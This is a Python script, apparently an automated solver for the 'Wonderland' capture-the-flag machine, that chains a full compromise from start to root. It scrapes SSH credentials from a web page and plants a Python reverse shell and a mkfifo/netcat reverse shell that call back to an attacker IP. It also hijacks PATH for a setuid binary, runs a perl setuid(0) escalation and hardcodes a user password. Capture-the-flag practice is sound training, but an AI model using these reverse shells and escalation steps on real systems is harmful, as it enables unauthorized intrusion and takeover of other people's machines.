
import requests 
import paramiko
from bs4 import BeautifulSoup as bs
from pwn import *

global rabbit, hatter


print(''' Welcome to Wonderland Hacking script 
                            - coded by DarkRider88 & Valerie23 ''')

hostt = str(input("Enter target IP: "))
host = hostt.rstrip("\n")
ip = str(input("Enter attacker's ip address(tun0): "))
ipp = ip.rstrip("\n")

#reading sourcecode
def webenum(host):
    print("[+] Finding user and password")
    page = requests.get("http://{}/r/a/b/b/i/t".format(host))
    con = bs(page.content,features="lxml")
    html = list(con.children)[1]
    body = list(html.children)[2]
    p = list(body.children)[9]
    user_pass = p.get_text()
    user, password = user_pass.split(':')
    print('[+] Found user and password')

    print("\nUser: {}".format(user))
    print("Password: {}".format(password))
    print("\n")
    ssh_connect(host,user,password)


#connecting to ssh
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def ssh_connect(host,user,password):

    print("[+] Connecting to SSH")
    try:
        client.connect(hostname= host, username=user, password = password)
        print("[+] Connected to SSH")
    except SSHException:
        print("[-] Connection refused")
    priv_esc()


### reading user.txt
def priv_esc():
    print("[+] Reading user.txt")
    stdin, stdout,stderr = client.exec_command("cat /root/user.txt")
    user_flag = stdout.read().decode()
    print("user flag: {}".format(user_flag))
    print("---------------------------RABBIT---------------------------------")
    #escalating to rabbit
    print("[+] Escalating to rabbit")
    print("[+] Reading some weird files..idk why")
    print("\n")
    client.exec_command(f"echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ipp}\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > random.py")
    print("[+] hacking NASA with HTML")
    print("Enter this in Alice: sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py")
    
    #turinig on the pwntools listener
    rabbit = listen(8000)
    
    
    print("[+] Trying to connect to Rabbit")
    
    rabbit.sendline("whoami")
    
    
    print("[+] Escalated to : Rabbit")
    print("--------------------------HATTER----------------------------------")



    print("[+] Hacking into Hatter now ")
    print("[+] Decrypting the TeaParty")
    print("[+] Having a date with her")
    rabbit.sendline(f'echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ipp} 8001 >/tmp/f" > /tmp/date')
    rabbit.sendline('chmod +x /tmp/date')
    rabbit.sendline("echo 'export PATH=/tmp:$PATH' > /tmp/exp.sh")
    rabbit.sendline("echo 'sleep 3 && /home/rabbit/teaParty' >> exp.sh")
    rabbit.sendline("bash exp.sh")
    rabbit.recv()
    hatter = listen(8001)
    
    hatter.sendline("whoami")
    print("[+] Escalated to : Hatter")

    
    print("----------------------------ROOT--------------------------------")


    #------------------------root-------------------

    #perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
    client.close()

    print("[+] Hacking into root now ")
    print("[+] Enumerating all the things")
    print("[+] Got the attack vector")
    print("[+] Escalating privileges...")
    print("[+] Creating the exploit.. here and there")
    hatter.sendline(f"echo 'cat /home/alice/root.txt' > /tmp/rev.sh")
    hatter.sendline('echo -n "/usr/bin/perl -e" > /tmp/toor.sh')
    hatter.sendline('echo -n " \'use POSIX qw(setuid); POSIX::setuid(0); exec" >> /tmp/toor.sh')
    hatter.sendline("echo -n ' \"bash /tmp/rev.sh\"' >> /tmp/toor.sh")
    hatter.sendline('echo -n ";\'" >> /tmp/toor.sh')

    hatter_ssh = paramiko.SSHClient()
    hatter_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
    hatter_ssh.connect(hostname=host,username = 'hatter', password = 'WhyIsARavenLikeAWritingDesk?')

    stdin, stdout, stderr = hatter_ssh.exec_command("bash /tmp/toor.sh")
    root_flag = stdout.read().decode()
    print("[+] Escalated to : Root")    
    
    print("[+] Hacked!")

    print("Here are your flags")
    print("USER FLAG: {}".format(user_flag))
    print("ROOT FLAG: {}".format(root_flag))
    



webenum(host)

